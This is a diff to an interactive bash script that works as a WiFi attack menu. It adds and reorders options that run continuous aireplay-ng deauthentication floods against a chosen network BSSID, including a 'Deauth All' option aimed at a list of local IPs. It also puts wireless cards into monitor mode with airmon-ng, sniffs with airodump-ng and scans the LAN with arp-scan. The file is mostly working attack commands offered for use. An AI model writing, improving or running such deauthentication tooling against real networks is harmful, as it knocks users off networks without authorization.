@@ -148,11 +148,15 @@ sleep 2
 aireplay-ng --deauth 0 -a $networkbssid -k $thereip
 fi
 if [[ $player1 == "3" ]]; then
+clear
 echo -e $lred"Deauth All"
 
 echo -e $lgreen"What is your ip base"
 echo "eg 192.168.1."
 read -p "-->>" ipbase
+
+echo -e $lgreen"What is the networkbssid"
+read -p "-->>" networkbssid
 
 c=
 ipcount="$ipbase$c"
@@ -166,14 +170,12 @@ done
 
 ips=`cat ips.txt`
 aireplay-ng --deauth 0 -a $networkbssid -k $ips
+sleep 10
 
 fi
 if [[ $player1 == "4" ]]; then
-clear
-arp-scan -l
-echo ""
-echo -e $lred""
-read -p "Press enter to exit..."
+echo "coming soon"
+sleep 3
 fi
 if [[ $player1 == "5" ]]; then
 clear
@@ -183,7 +185,8 @@ echo -e $lgreen"What is your interface:"
 read -p "-->>" interface
 echo "putting card in monitor mode"
 sleep 1
-aireplay-ng start $interface
+airmon-ng check kill
+airmon-ng start $interface
 mon="mon"
 interfacemon="$interface$mon"
 echo "Done"
@@ -191,7 +194,7 @@ echo ""
 echo "Starting Scan..."
 sleep 1
 airodump-ng $interfacemon
-
+airmon-ng stop $interfacemon
 fi
 if [[ $player1 == "6" ]]; then
 clear
@@ -201,7 +204,8 @@ echo $lgreen"Whats your interface:"
 read -p "-->>" interface
 echo "putting card in monitor mode"
 sleep 1
-aireplay-ng start $interface
+airmon-ng check kill
+airmon-ng start $interface
 mon="mon"
 interfacemon="$interface$mon"
 echo "Done"
@@ -212,6 +216,15 @@ echo ""
 echo "Starting Scan..."
 sleep 1
 airodump-ng -c $channel $interfacemon
+sleep 3
+airmon-ng stop $interfacemon
+fi
+if [[ $player1 == "7" ]]; then
+clear
+arp-scan -l
+echo ""
+echo -e $lred""
+read -p "Press enter to exit..."
 fi
 if [[ $player1 == "e" ]]; then
 exit 0
